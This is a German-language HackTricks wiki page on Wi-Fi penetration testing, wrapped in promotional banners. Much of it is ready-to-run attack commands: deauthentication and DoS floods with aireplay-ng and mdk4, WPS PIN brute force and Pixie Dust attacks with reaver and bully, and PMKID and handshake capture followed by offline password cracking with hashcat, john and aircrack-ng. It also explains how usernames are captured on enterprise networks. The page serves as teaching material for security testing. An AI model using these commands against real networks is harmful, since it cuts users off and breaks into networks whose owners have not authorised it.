# Pentesting Wifi

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtigen Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!

## Wifi-Grundbefehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Werkzeuge

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon ist ein vielseitiges Tool zur Pr√ºfung der Sicherheit von drahtlosen Netzwerken.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**F√ºhren Sie airgeddon mit Docker aus**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Es kann Evil Twin, KARMA und Known Beacons Angriffe durchf√ºhren und dann eine Phishing-Vorlage verwenden, um das tats√§chliche Netzwerkkennwort zu erhalten oder Zugangsdaten f√ºr soziale Netzwerke zu erfassen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK**-Angriffe. Es wird automatisch:

* Setzen des Interfaces in den Monitor-Modus
* Scannen nach m√∂glichen Netzwerken - und erm√∂glicht es Ihnen, das Opfer auszuw√§hlen
* Bei WEP - WEP-Angriffe starten
* Bei WPA-PSK
* Bei WPS: Pixie Dust-Angriff und Brute-Force-Angriff (seien Sie vorsichtig, der Brute-Force-Angriff k√∂nnte lange dauern). Beachten Sie, dass keine Null-PIN oder Datenbank-/generierten PINs ausprobiert werden.
* Versuchen, den PMKID vom AP zu erfassen, um ihn zu knacken
* Versuchen, Clients des AP zu deauthentifizieren, um einen Handshake zu erfassen
* Bei PMKID oder Handshake versuchen, mit den top5000 Passw√∂rtern Brute-Force durchzuf√ºhren.

## Angriffs√ºbersicht

* **DoS**
* Deauthentifizierung/Disassoziierung -- Alle trennen (oder ein bestimmtes ESSID/Client)
* Zuf√§llige Fake-APs -- Verstecke Netze, m√∂gliche Scannerabst√ºrze
* AP √ºberlasten -- Versuchen, den AP zu deaktivieren (normalerweise nicht sehr n√ºtzlich)
* WIDS -- Mit dem IDS spielen
* TKIP, EAPOL -- Einige spezifische Angriffe, um einige APs zu DoS
* **Knacken**
* Knacken von **WEP** (mehrere Tools und Methoden)
* **WPA-PSK**
* **WPS** PIN "Brute-Force"
* **WPA PMKID** Brute-Force
* \[DoS +] **WPA-Handshake** Erfassung + Knacken
* **WPA-MGT**
* **Benutzername erfassen**
* **Brute-Force** Anmeldedaten
* **Evil Twin** (mit oder ohne DoS)
* **Offener** Evil Twin \[+ DoS] -- N√ºtzlich, um Captive Portal-Anmeldeinformationen zu erfassen und/oder LAN-Angriffe durchzuf√ºhren
* **WPA-PSK** Evil Twin -- N√ºtzlich f√ºr Netzwerkangriffe, wenn Sie das Passwort kennen
* **WPA-MGT** -- N√ºtzlich, um Firmenanmeldeinformationen zu erfassen
* **KARMA, MANA**, **Loud MANA**, **Bekanntes Beacon**
* **+ Offen** -- N√ºtzlich, um Captive Portal-Anmeldeinformationen zu erfassen und/oder LAN-Angriffe durchzuf√ºhren
* **+ WPA** -- N√ºtzlich, um WPA-Handshakes zu erfassen

## DOS

### Deauthentifizierungspakete

**Beschreibung von** [**hier**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentifizierungs**-Angriffe, eine verbreitete Methode im Wi-Fi-Hacking, beinhalten das F√§lschen von "Management"-Frames, um **Ger√§te gewaltsam von einem Netzwerk zu trennen**. Diese unverschl√ºsselten Pakete t√§uschen Clients vor, dass sie vom legitimen Netzwerk stammen, was Angreifern erm√∂glicht, WPA-Handshakes f√ºr Knackzwecke zu sammeln oder Netzwerkverbindungen dauerhaft zu st√∂ren. Diese Taktik, alarmierend in ihrer Einfachheit, wird weit verbreitet eingesetzt und hat erhebliche Auswirkungen auf die Netzwerksicherheit.

**Deauthentifizierung mit Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 bedeutet Deauthentifizierung
* 1 ist die Anzahl der zu sendenden Deauths (Sie k√∂nnen mehrere senden, wenn Sie m√∂chten); 0 bedeutet, sie kontinuierlich zu senden
* \-a 00:14:6C:7E:40:80 ist die MAC-Adresse des Zugriffspunkts
* \-c 00:0F:B5:34:30:30 ist die MAC-Adresse des Clients, der deauthentifiziert werden soll; wenn dies ausgelassen wird, wird eine Rundruf-Deauthentifizierung gesendet (funktioniert nicht immer)
* ath0 ist der Schnittstellennamen

### Trennungspakete

**Trennungspakete**, √§hnlich wie Deauthentifizierungspakete, sind eine Art von Verwaltungsrahmen, die in Wi-Fi-Netzwerken verwendet werden. Diese Pakete dienen dazu, die Verbindung zwischen einem Ger√§t (wie einem Laptop oder Smartphone) und einem Zugriffspunkt (AP) zu trennen. Der Hauptunterschied zwischen Trennung und Deauthentifizierung liegt in ihren Anwendungsszenarien. W√§hrend ein AP **Deauthentifizierungspakete aussendet, um Rogue-Ger√§te explizit aus dem Netzwerk zu entfernen, werden Trennungspakete in der Regel gesendet, wenn der AP einen Neustart durchf√ºhrt, heruntergefahren wird oder umzieht, was die Trennung aller verbundenen Knoten erforderlich macht.**

**Dieser Angriff kann von mdk4 (Modus "d") durchgef√ºhrt werden:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Weitere DOS-Angriffe durch mdk4**

**Hier** [**klicken**](https://en.kali.tools/?p=864)**.**

**ANGRIFFSMODUS b: Beacon-Flutung**

Sendet Beacon-Frames, um gef√§lschte APs bei Clients anzuzeigen. Dies kann manchmal Netzwerkscanner und sogar Treiber zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ANGRIFFSMODUS a: Authentifizierungsverweigerung**

Das Senden von Authentifizierungsrahmen an alle erreichbaren Access Points (APs) in Reichweite kann diese APs √ºberlasten, insbesondere wenn zahlreiche Clients beteiligt sind. Dieser intensive Datenverkehr kann zu Systeminstabilit√§t f√ºhren, wodurch einige APs einfrieren oder sogar zur√ºckgesetzt werden k√∂nnen.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ANGRIFFSMODUS p: SSID-Sondierung und Bruteforcing**

Das Sondieren von Zugriffspunkten (APs) √ºberpr√ºft, ob eine SSID ordnungsgem√§√ü offengelegt wird und best√§tigt die Reichweite des APs. Diese Technik, in Verbindung mit dem **Bruteforcing versteckter SSIDs** mit oder ohne Wortliste, hilft bei der Identifizierung und dem Zugriff auf verborgene Netzwerke.

**ANGRIFFSMODUS m: Ausnutzung von Michael-Gegenma√ünahmen**

Das Senden von zuf√§lligen oder duplizierten Paketen an verschiedene QoS-Warteschlangen kann Michael-Gegenma√ünahmen auf **TKIP-APs** ausl√∂sen, was zu einer einmin√ºtigen Abschaltung des APs f√ºhrt. Diese Methode ist eine effiziente **DoS** (Denial of Service)-Angriffstaktik.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ANGRIFFSMODUS e: EAPOL Start- und Logoff-Paketinjektion**

Das √úberschwemmen eines AP mit **EAPOL Start-Frames** erzeugt **gef√§lschte Sitzungen**, √ºberlastet den AP und blockiert legitime Clients. Alternativ k√∂nnen durch das Einspeisen von **gef√§lschten EAPOL Logoff-Nachrichten** Clients zwangsweise getrennt werden. Beide Methoden st√∂ren die Netzwerkdienste effektiv.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ANGRIFFSMODUS s: Angriffe auf IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf die Verbindungsverwaltung und das Routing in Mesh-Netzwerken.

**ANGRIFFSMODUS w: WIDS-Verwirrung**

Das Verbinden von Clients mit mehreren WDS-Knoten oder gef√§lschten Rogue-APs kann Intrusion Detection und Prevention Systems manipulieren, Verwirrung stiften und potenziellen Missbrauch des Systems erm√∂glichen.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ANGRIFFSMODUS f: Paket-Fuzzer**

Ein Paket-Fuzzer mit vielf√§ltigen Paketquellen und einem umfassenden Satz von Modifikatoren zur Paketmanipulation.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der in den vorherigen Kommentaren vorgeschlagenen Angriffe:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereinfacht den Prozess des Verbindens von Ger√§ten mit einem Router, verbessert die Einrichtungsgeschwindigkeit und -einfachheit f√ºr Netzwerke, die mit **WPA** oder **WPA2** Personal verschl√ºsselt sind. Es ist f√ºr die leicht kompromittierbare WEP-Sicherheit unwirksam. WPS verwendet eine 8-stellige PIN, die in zwei H√§lften validiert wird, was sie anf√§llig f√ºr Brute-Force-Angriffe macht, aufgrund ihrer begrenzten Anzahl von Kombinationen (11.000 M√∂glichkeiten).

### WPS-Brute-Force

Es gibt 2 Hauptwerkzeuge, um diese Aktion auszuf√ºhren: Reaver und Bully.

* **Reaver** wurde entwickelt, um ein robuster und praktischer Angriff gegen WPS zu sein und wurde gegen eine Vielzahl von Zugriffspunkten und WPS-Implementierungen getestet.
* **Bully** ist eine **neue Implementierung** des WPS-Brute-Force-Angriffs, geschrieben in C. Es hat mehrere Vorteile gegen√ºber dem Originalcode von Reaver: weniger Abh√§ngigkeiten, verbesserte Speicher- und CPU-Leistung, korrekte Behandlung der Byte-Reihenfolge und einen robusteren Satz von Optionen.

Der Angriff nutzt die **Schwachstelle der WPS-PIN** aus, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Pr√ºfsumme, was den Brute-Force-Angriff erleichtert. Verteidigungen gegen Brute-Force-Angriffe, wie das **Blockieren von MAC-Adressen** aggressiver Angreifer, erfordern eine **MAC-Adressrotation**, um den Angriff fortzusetzen.

Nach dem Erhalten der WPS-PIN mit Tools wie Bully oder Reaver kann der Angreifer den WPA/WPA2 PSK ableiten und so einen **dauerhaften Netzwerkzugriff** sicherstellen.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Intelligenter Brute-Force**

Dieser verfeinerte Ansatz zielt darauf ab, WPS-PINs unter Verwendung bekannter Schwachstellen anzugreifen:

1. **Vorab entdeckte PINs**: Nutzen Sie eine Datenbank bekannter PINs, die mit bestimmten Herstellern verkn√ºpft sind, die einheitliche WPS-PINs verwenden. Diese Datenbank korreliert die ersten drei Oktette der MAC-Adressen mit wahrscheinlichen PINs f√ºr diese Hersteller.
2. **PIN-Generierungsalgorithmen**: Nutzen Sie Algorithmen wie ComputePIN und EasyBox, die WPS-PINs basierend auf der MAC-Adresse des AP berechnen. Der Arcadyan-Algorithmus erfordert zus√§tzlich eine Ger√§te-ID, was dem PIN-Generierungsprozess eine weitere Ebene hinzuf√ºgt.

### WPS Pixie Dust Angriff

**Dominique Bongard** entdeckte einen Fehler in einigen Access Points (APs) bez√ºglich der Erstellung von geheimen Codes, bekannt als **Nonces** (**E-S1** und **E-S2**). Wenn diese Nonces herausgefunden werden k√∂nnen, wird das Knacken der WPS-PIN des APs einfach. Der AP enth√ºllt die PIN innerhalb eines speziellen Codes (Hash), um zu beweisen, dass er legitim ist und kein gef√§lschter (Rogue) AP ist. Diese Nonces sind im Wesentlichen die "Schl√ºssel" zum Entsperren des "Safes", der die WPS-PIN enth√§lt. Weitere Informationen dazu finden Sie [hier](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Einfach ausgedr√ºckt besteht das Problem darin, dass einige APs nicht zuf√§llig genug Schl√ºssel f√ºr die Verschl√ºsselung der PIN w√§hrend des Verbindungsvorgangs verwendet haben. Dies macht die PIN anf√§llig daf√ºr, von au√üerhalb des Netzwerks geraten zu werden (offline Brute-Force-Angriff).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn Sie das Ger√§t nicht in den √úberwachungsmodus wechseln m√∂chten oder `reaver` und `bully` Probleme haben, k√∂nnen Sie [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann den Pixie Dust-Angriff ausf√ºhren, ohne in den √úberwachungsmodus wechseln zu m√ºssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin Angriff

Einige schlecht konzipierte Systeme erlauben sogar, dass ein **Null-PIN** (ein leerer oder nicht vorhandener PIN) Zugriff gew√§hrt, was ziemlich ungew√∂hnlich ist. Das Tool **Reaver** ist in der Lage, diese Schwachstelle zu testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Alle vorgeschlagenen WPS-Angriffe k√∂nnen einfach mit _**airgeddon**_ durchgef√ºhrt werden.

![](<../../.gitbook/assets/image (219).png>)

* 5 und 6 erm√∂glichen es Ihnen, **Ihre benutzerdefinierte PIN** zu versuchen (falls Sie eine haben)
* 7 und 8 f√ºhren den **Pixie Dust Angriff** durch
* 13 erm√∂glicht es Ihnen, die **NULL PIN** zu testen
* 11 und 12 werden die PINs, die mit dem ausgew√§hlten AP aus verf√ºgbaren Datenbanken zusammenh√§ngen, **zusammentragen** und m√∂gliche **PINs** generieren, indem sie ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?) verwenden
* 9 und 10 werden **jede m√∂gliche PIN** testen

## **WEP**

So kaputt und heutzutage ungenutzt. Wissen Sie einfach, dass _**airgeddon**_ eine WEP-Option namens "All-in-One" hat, um diese Art von Schutz anzugreifen. Mehr Tools bieten √§hnliche Optionen.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die in die Spannung und Herausforderungen des Hackens eintauchen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattform-Updates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit den Top-Hackern zusammenzuarbeiten!

***

## WPA/WPA2 PSK

### PMKID

Im Jahr 2018 enth√ºllte **hashcat** [eine neue Angriffsmethode](https://hashcat.net/forum/thread-7717.html), die einzigartig ist, da sie nur **ein einziges Paket** ben√∂tigt und keine Clients erforderlich sind, die mit dem Ziel-AP verbunden sind - nur die Interaktion zwischen dem Angreifer und dem AP.

Viele moderne Router f√ºgen dem **ersten EAPOL**-Frame w√§hrend der Assoziation ein **optionales Feld** hinzu, bekannt als `Robust Security Network`. Dies beinhaltet den `PMKID`.

Wie im Originalbeitrag erkl√§rt, wird der **PMKID** unter Verwendung bekannter Daten erstellt:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Angesichts dessen, dass der "PMK-Name" konstant ist, kennen wir die BSSID des AP und der Station, und der `PMK` ist identisch mit dem aus einem vollst√§ndigen 4-Wege-Handshake, kann **hashcat** diese Informationen verwenden, um den PSK zu knacken und das Passwort wiederherzustellen!

Um diese Informationen zu **sammeln** und das Passwort lokal per **Bruteforce** zu knacken, k√∂nnen Sie Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs, die erfasst wurden**, werden in der **Konsole** angezeigt und auch im Verzeichnis \_/tmp/attack.pcap\_ **gespeichert**.  
Konvertiere nun den Capture in das Format von **hashcat/john** und knacke es:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten Hashs **4 Teile** enth√§lt, wie: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. Wenn Ihrer **nur** **3 Teile** enth√§lt, ist er **ung√ºltig** (die PMKID-Erfassung war nicht g√ºltig).

Beachten Sie, dass `hcxdumptool` auch **Handshakes erfasst** (etwas √Ñhnliches wird angezeigt: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Sie k√∂nnen die **Handshakes** in das **hashcat**/**john**-Format mit `cap2hccapx` **umwandeln**.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ich habe festgestellt, dass einige mit diesem Tool erfassten Handshakes selbst bei Kenntnis des richtigen Passworts nicht geknackt werden konnten. Ich w√ºrde empfehlen, Handshakes auch auf herk√∂mmliche Weise zu erfassen, wenn m√∂glich, oder mehrere davon mit diesem Tool zu erfassen._

### Handshake-Erfassung

Ein Angriff auf **WPA/WPA2**-Netzwerke kann durch Erfassen eines **Handshakes** und den Versuch, das Passwort **offline zu knacken**, ausgef√ºhrt werden. Dieser Prozess beinhaltet das √úberwachen der Kommunikation eines bestimmten Netzwerks und **BSSID** auf einem bestimmten **Kanal**. Hier ist eine √ºbersichtliche Anleitung:

1. Identifiziere die **BSSID**, den **Kanal** und einen **verbundenen Client** des Zielnetzwerks.
2. Verwende `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen Kanal und BSSID zu √ºberwachen, in der Hoffnung, einen Handshake zu erfassen. Der Befehl wird wie folgt aussehen:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Um die Chance zu erh√∂hen, einen Handshake zu erfassen, trennen Sie den Client vor√ºbergehend vom Netzwerk, um eine erneute Authentifizierung zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` durch Senden von Deauthentifizierungspaketen an den Client erreicht werden:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note, dass da der Client deauthentifiziert wurde, er versuchen k√∂nnte, sich mit einem anderen AP zu verbinden oder in anderen F√§llen mit einem anderen Netzwerk._

Sobald in `airodump-ng` einige Handshake-Informationen erscheinen, bedeutet dies, dass der Handshake erfasst wurde und du das Abh√∂ren stoppen kannst:

![](<../../.gitbook/assets/image (172) (1).png>)

Sobald der Handshake erfasst ist, kannst du ihn mit `aircrack-ng` **knacken**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### √úberpr√ºfen Sie, ob der Handshake in der Datei vorhanden ist

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen unvollst√§ndigen Handshake eines ESSID vor dem vollst√§ndigen findet, wird es den g√ºltigen nicht erkennen._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **Unternehmens-WLAN-Setups sto√üen Sie auf verschiedene Authentifizierungsmethoden**, die jeweils unterschiedliche Sicherheitsstufen und Verwaltungsfunktionen bieten. Wenn Sie Tools wie `airodump-ng` zur Inspektion des Netzwerkverkehrs verwenden, k√∂nnten Sie Kennungen f√ºr diese Authentifizierungstypen bemerken. Einige g√§ngige Methoden sind:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Diese Methode unterst√ºtzt Hardware-Token und Einmalpassw√∂rter innerhalb von EAP-PEAP. Im Gegensatz zu MSCHAPv2 verwendet sie keine Peer-Herausforderung und sendet Passw√∂rter im Klartext an den Zugriffspunkt, was ein Risiko f√ºr Downgrade-Angriffe darstellt.
2. **EAP-MD5 (Message Digest 5)**:
* Beinhaltet das Senden des MD5-Hash des Passworts vom Client. Es wird **nicht empfohlen** aufgrund der Anf√§lligkeit f√ºr W√∂rterbuchangriffe, des Mangels an Serverauthentifizierung und der Unf√§higkeit, sessionsspezifische WEP-Schl√ºssel zu generieren.
3. **EAP-TLS (Transport Layer Security)**:
* Nutzt sowohl Client- als auch Serverzertifikate zur Authentifizierung und kann benutzerbasierte und sessionsspezifische WEP-Schl√ºssel dynamisch generieren, um die Kommunikation zu sichern.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Bietet eine gegenseitige Authentifizierung √ºber einen verschl√ºsselten Tunnel sowie eine Methode zur Ableitung dynamischer, benutzerspezifischer, sessionsspezifischer WEP-Schl√ºssel. Es erfordert nur Serverzertifikate, wobei Clients Anmeldeinformationen verwenden.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Funktioniert √§hnlich wie EAP, indem es einen TLS-Tunnel f√ºr gesch√ºtzte Kommunikation erstellt. Es erm√∂glicht die Verwendung schw√§cherer Authentifizierungsprotokolle auf Basis von EAP aufgrund des Schutzes, den der Tunnel bietet.
* **PEAP-MSCHAPv2**: Oft als PEAP bezeichnet, kombiniert es den anf√§lligen MSCHAPv2-Herausforderungs-/Antwortmechanismus mit einem sch√ºtzenden TLS-Tunnel.
* **PEAP-EAP-TLS (oder PEAP-TLS)**: √Ñhnlich wie EAP-TLS, initiiert jedoch einen TLS-Tunnel, bevor Zertifikate ausgetauscht werden, was eine zus√§tzliche Sicherheitsebene bietet.

Weitere Informationen zu diesen Authentifizierungsmethoden finden Sie [hier](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) und [hier](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Benutzername erfassen

Beim Lesen von [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) sieht es so aus, als ob bei Verwendung von **EAP** die **"Identit√§ts"**-**Nachrichten** unterst√ºtzt werden m√ºssen und der **Benutzername** in den **"Antwort-Identit√§ts"**-Nachrichten im **Klartext** gesendet wird.

Selbst bei Verwendung einer der sichersten Authentifizierungsmethoden: **PEAP-EAP-TLS** ist es m√∂glich, den im EAP-Protokoll gesendeten Benutzernamen zu **erfassen**. Um dies zu tun, **erfassen Sie eine Authentifizierungskommunikation** (starten Sie `airodump-ng` auf einem Kanal und `wireshark` auf der gleichen Schnittstelle) und filtern Sie die Pakete nach `eapol`.\
Im "**Antwort, Identit√§t**"-Paket wird der **Benutzername** des Clients angezeigt.

![](<../../.gitbook/assets/image (850).png>)

### Anonyme Identit√§ten

Die Identit√§tsverbergung wird sowohl von EAP-PEAP als auch von EAP-TTLS unterst√ºtzt. Im Kontext eines WLAN-Netzwerks wird eine EAP-Identit√§tsanfrage in der Regel vom Zugriffspunkt (AP) w√§hrend des Assoziationsprozesses initiiert. Um den Schutz der Benutzeranonymit√§t zu gew√§hrleisten, enth√§lt die Antwort des EAP-Clients auf dem Ger√§t des Benutzers nur die f√ºr den initialen RADIUS-Server erforderlichen Informationen zur Verarbeitung der Anfrage. Dieses Konzept wird durch die folgenden Szenarien veranschaulicht:

* EAP-Identit√§t = anonym
* In diesem Szenario verwenden alle Benutzer das Pseudonym "anonym" als ihren Benutzeridentifikator. Der initiale RADIUS-Server fungiert entweder als EAP-PEAP- oder EAP-TTLS-Server und ist f√ºr die Verwaltung des serverseitigen Teils des PEAP- oder TTLS-Protokolls verantwortlich. Die innere (gesch√ºtzte) Authentifizierungsmethode wird entweder lokal behandelt oder an einen entfernten (Heim-)RADIUS-Server delegiert.
* EAP-Identit√§t = anonym@realm\_x
* In dieser Situation verbergen Benutzer aus verschiedenen Bereichen ihre Identit√§ten, w√§hrend sie ihre jeweiligen Bereiche angeben. Dies erm√∂glicht es dem initialen RADIUS-Server, die EAP-PEAP- oder EAP-TTLS-Anfragen an RADIUS-Server in ihren Heimbereichen weiterzuleiten, die als PEAP- oder TTLS-Server fungieren. Der initiale RADIUS-Server fungiert ausschlie√ülich als RADIUS-Relaisknoten.
* Alternativ kann der initiale RADIUS-Server als EAP-PEAP- oder EAP-TTLS-Server fungieren und die gesch√ºtzte Authentifizierungsmethode entweder selbst behandeln oder an einen anderen Server weiterleiten. Diese Option erleichtert die Konfiguration unterschiedlicher Richtlinien f√ºr verschiedene Bereiche.

In EAP-PEAP initiiert der PEAP-Server, sobald der TLS-Tunnel zwischen dem PEAP-Server und dem PEAP-Client hergestellt ist, eine EAP-Identit√§tsanfrage und √ºbertr√§gt sie durch den TLS-Tunnel. Der Client antwortet auf diese zweite EAP-Identit√§tsanfrage, indem er eine EAP-Identit√§tsantwort sendet, die die wahre Identit√§t des Benutzers durch den verschl√ºsselten Tunnel enth√§lt. Dieser Ansatz verhindert effektiv die Offenlegung der tats√§chlichen Identit√§t des Benutzers f√ºr jeden, der den 802.11-Verkehr belauscht.

